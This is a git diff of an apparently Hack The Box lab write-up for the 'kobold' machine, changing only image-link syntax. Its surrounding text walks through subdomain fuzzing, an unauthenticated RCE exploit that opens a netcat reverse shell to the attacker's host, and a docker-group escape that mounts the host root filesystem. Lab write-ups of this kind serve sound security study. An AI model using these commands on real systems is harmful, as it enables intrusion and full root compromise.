@@ -63,7 +63,7 @@ PORT    STATE SERVICE  REASON         VERSION
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
-![[Pasted image 20260326084618.png]]
+![Pasted image 20260326084618](../Attachments/Pasted%20image%2020260326084618.png)
 
 - With ffuf I find 2 other sublinks: `bin.kobold.htb` and `mcp.kobold.htb` for https:
 ```
@@ -99,16 +99,16 @@ mcp                     [Status: 200, Size: 466, Words: 57, Lines: 15, Duration:
 ```
 
 #### bin.kobold.htb
-![[Pasted image 20260326085834.png]]
+![Pasted image 20260326085834](../Attachments/Pasted%20image%2020260326085834.png)
 
 #### mcp.kobold.htb
-![[Pasted image 20260326085921.png]]
+![Pasted image 20260326085921](../Attachments/Pasted%20image%2020260326085921.png)
 
 - When trying to log in I receive the following error:
-![[Pasted image 20260326090058.png]]
+![Pasted image 20260326090058](../Attachments/Pasted%20image%2020260326090058.png)
 
 - Checking settings I see the app version:
-![[Pasted image 20260326093538.png]]
+![Pasted image 20260326093538](../Attachments/Pasted%20image%2020260326093538.png)
 
 - Looking online I find an exploit: https://github.com/fckoo/mcpjaminspector-unauth-rce
 - Using this exploit I get a reverse shell:
@@ -120,39 +120,39 @@ python3 exploit.py --target https://mcp.kobold.htb --command "busybox nc 10.10.1
   warnings.warn(
 {"success":false,"error":"Connection failed for server exploit: MCP error -32001: Request timed out","details":"MCP error -32001: Request timed out"}
 ```
-![[Pasted image 20260326093638.png]]
+![Pasted image 20260326093638](../Attachments/Pasted%20image%2020260326093638.png)
 
 - I grab the user flag:
-![[Pasted image 20260326093704.png]]
+![Pasted image 20260326093704](../Attachments/Pasted%20image%2020260326093704.png)
 
 ### Privilege Escalation
 
 - Looking at IP address I see I am in a docker container.
 - Furthermore looking at my id I am part of the operator group:
-![[Pasted image 20260326095402.png]]
+![Pasted image 20260326095402](../Attachments/Pasted%20image%2020260326095402.png)
 
 -  ***Generally if we are part of the docker group we can create docker containers. Using this we could mount the host root directory into a container to escape  as root***
 	- But we are in operator group
-![[Pasted image 20260326095749.png]]
+![Pasted image 20260326095749](../Attachments/Pasted%20image%2020260326095749.png)
 - We try to change group to docker via the `newgrp` command and it does not ask us for a password (iplying that this account was created with the docker group and so it implicitly accepts the user into the group
 - Now we can start a container with the root folder mounted on to it.
 
 - looking at docker images available:
-![[Pasted image 20260326095924.png]]
+![Pasted image 20260326095924](../Attachments/Pasted%20image%2020260326095924.png)
 
 - I can then run the following exploit on the latest image (the other one runs as `nobody`) to grab the root flag:
 ```
 docker run -v /:/mnt --rm mysql sh -c "cp /mnt/root/root.txt /mnt/tmp/flag.txt && chmod 777 /mnt/tmp/flag.txt"
 ```
 - I can then read the flag:
-![[Pasted image 20260326101116.png]]
+![Pasted image 20260326101116](../Attachments/Pasted%20image%2020260326101116.png)
 
 
 - Alternatively I can pass:
 ```
 docker run -v /:/mnt --rm -it mysql chroot /mnt bash
 ```
-![[Pasted image 20260326101256.png]]
+![Pasted image 20260326101256](../Attachments/Pasted%20image%2020260326101256.png)
 
 - I grab the root flag:
-![[Pasted image 20260326101349.png]]
+![Pasted image 20260326101349](../Attachments/Pasted%20image%2020260326101349.png)
